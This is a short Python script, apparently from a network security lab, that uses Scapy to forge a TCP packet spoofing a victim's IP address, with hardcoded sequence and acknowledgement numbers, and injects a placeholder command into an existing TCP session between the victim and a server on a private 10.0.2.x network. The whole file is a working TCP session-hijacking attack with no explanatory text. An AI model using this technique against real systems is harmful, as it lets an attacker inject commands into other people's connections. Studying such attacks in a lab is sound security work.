from scapy.all import IP, TCP, send

victim_ip = "10.0.2.4"
server_ip = "10.0.2.5"
sport = 42930
dport = 9999
seq = 3644959330
ack = 3459802342
spoofed = IP(src = victim_ip, dst = server_ip) / \
        TCP(sport = sport, dport = dport, flags = "PA", seq=seq, ack=ack)/ \
        "INJECTED CMD"

send(spoofed)
print("Spoofed pakcet sent")

